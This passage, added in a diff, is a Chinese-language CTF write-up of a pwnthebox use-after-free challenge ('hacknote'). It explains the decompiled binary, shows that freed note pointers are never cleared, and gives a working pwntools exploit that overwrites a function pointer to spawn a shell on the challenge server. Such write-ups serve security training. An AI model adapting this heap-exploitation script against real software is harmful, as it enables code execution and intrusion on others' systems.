@@ -2512,6 +2512,218 @@ io.interactive()
 
 ------
 
+### [baby rop 2](https://ce.pwnthebox.com/challenges?type=4&page=1&id=558)
+
+
+
+### [uaf](https://ce.pwnthebox.com/challenges?id=559)
+
+先`file ./hacknote `查看文件类型，再`checksec --file=./hacknote `检查一下文件保护情况。
+
+```bash
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
+└─$ file ./hacknote            
+./hacknote: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=44ee75c492628b3691cdcdb07759e9bbe551644a, not stripped
+                                                                                                    
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
+└─$ checksec --file=./hacknote            
+[*] '/home/tyd/ctf/pwn/pwnthebox/hacknote'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+```
+
+使用`IDA pro 32bit`打开附件`hacknote`，按`F5`反汇编源码并查看主函数。输入`1`增加节点，输入`2`删除节点，输入`3`打印节点。
+
+```c
+int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
+{
+  int v3; // eax
+  char buf[4]; // [esp+0h] [ebp-Ch] BYREF
+  int *v5; // [esp+4h] [ebp-8h]
+
+  v5 = &argc;
+  setvbuf(stdout, 0, 2, 0);
+  setvbuf(stdin, 0, 2, 0);
+  while ( 1 )
+  {
+    while ( 1 )
+    {
+      menu();
+      read(0, buf, 4u);
+      v3 = atoi(buf);
+      if ( v3 != 2 )
+        break;
+      del_note();
+    }
+    if ( v3 > 2 )
+    {
+      if ( v3 == 3 )
+      {
+        print_note();
+      }
+      else
+      {
+        if ( v3 == 4 )
+          exit(0);
+LABEL_13:
+        puts("Invalid choice");
+      }
+    }
+    else
+    {
+      if ( v3 != 1 )
+        goto LABEL_13;
+      add_note();
+    }
+  }
+}
+```
+
+查看增加节点的函数`add_note()`，发现最多创建`5`个`chunk`，`notelist[i]`用来存放`chunk`的地址，`notelist`是存放在`.bss`段上的，申请了一个大小为`8`字节的`chunk`保存当前`chunk`的指针，然后再`malloc`用户申请的`chunk`。
+
+`read(0, *(void **)(*((_DWORD *)&notelist + i) + 4), size)`用来向`chunk`中写入`size`大小的内容。
+
+```c
+int add_note()
+{
+  int result; // eax
+  int v1; // esi
+  char buf[8]; // [esp+0h] [ebp-18h] BYREF
+  size_t size; // [esp+8h] [ebp-10h]
+  int i; // [esp+Ch] [ebp-Ch]
+
+  result = count;
+  if ( count > 5 )
+    return puts("Full");
+  for ( i = 0; i <= 4; ++i )
+  {
+    result = *((_DWORD *)&notelist + i);
+    if ( !result )
+    {
+      *((_DWORD *)&notelist + i) = malloc(8u);
+      if ( !*((_DWORD *)&notelist + i) )
+      {
+        puts("Alloca Error");
+        exit(-1);
+      }
+      **((_DWORD **)&notelist + i) = print_note_content;
+      printf("Note size :");
+      read(0, buf, 8u);
+      size = atoi(buf);
+      v1 = *((_DWORD *)&notelist + i);
+      *(_DWORD *)(v1 + 4) = malloc(size);
+      if ( !*(_DWORD *)(*((_DWORD *)&notelist + i) + 4) )
+      {
+        puts("Alloca Error");
+        exit(-1);
+      }
+      printf("Content :");
+      read(0, *(void **)(*((_DWORD *)&notelist + i) + 4), size);
+      puts("Success !");
+      return ++count;
+    }
+  }
+  return result;
+}
+```
+
+`del_note()`函数中，`free`释放掉相应的`chunk`后并没有将`chunk`的指针置为`0`，所以存在`uaf`漏洞。
+
+```c
+int del_note()
+{
+  int result; // eax
+  char buf[4]; // [esp+8h] [ebp-10h] BYREF
+  int v2; // [esp+Ch] [ebp-Ch]
+
+  printf("Index :");
+  read(0, buf, 4u);
+  v2 = atoi(buf);
+  if ( v2 < 0 || v2 >= count )
+  {
+    puts("Out of bound!");
+    _exit(0);
+  }
+  result = *((_DWORD *)&notelist + v2);
+  if ( result )
+  {
+    free(*(void **)(*((_DWORD *)&notelist + v2) + 4));
+    free(*((void **)&notelist + v2));
+    result = puts("Success");
+  }
+  return result;
+}
+```
+
+`print_note()`函数可以用来输出`chunk`中的内容。
+
+```c
+int print_note()
+{
+  int result; // eax
+  char buf[4]; // [esp+8h] [ebp-10h] BYREF
+  int v2; // [esp+Ch] [ebp-Ch]
+
+  printf("Index :");
+  read(0, buf, 4u);
+  v2 = atoi(buf);
+  if ( v2 < 0 || v2 >= count )
+  {
+    puts("Out of bound!");
+    _exit(0);
+  }
+  result = *((_DWORD *)&notelist + v2);
+  if ( result )
+    result = (**((int (__cdecl ***)(_DWORD))&notelist + v2))(*((_DWORD *)&notelist + v2));
+  return result;
+}
+```
+
+注意到程序中有个`magic()`函数地址为`0x8048945`。
+
+```c
+int magic()
+{
+  return system("/bin/sh");
+}
+```
+
+我们可以利用`uaf`漏洞来修改`chunk`指针的内容从而调用`/bin/sh`，编写`Python`脚本连接`redirect.do-not-trust.hacking.run`的监听端口`10020`，发送`payload`即可得到`PTB{cb3bb65d-204d-45b7-a565-6553d0de729c}`。
+
+```python
+from pwn import *
+
+def add(size, content):
+    io.sendlineafter('Your choice :', '1')
+    io.sendlineafter('Note size :', str(size))
+    io.sendlineafter('Content :', content)
+
+def free(index):
+    io.sendlineafter('choice :', '2')
+    io.sendlineafter('Index :', str(index))
+
+def show(index):
+    io.sendlineafter('choice :', '3')
+    io.sendlineafter('Index :', str(index))
+
+io = remote('redirect.do-not-trust.hacking.run', 10020)
+magic_address = 0x8048945
+add(0x20, b'fuck')
+add(0x20, b'fuck')
+free(0)
+free(1)
+add(0x8, p64(magic_address))
+show(0)
+io.interactive()
+```
+
+------
+
+
+
 ## Pwnable.kr
 
 ### fd
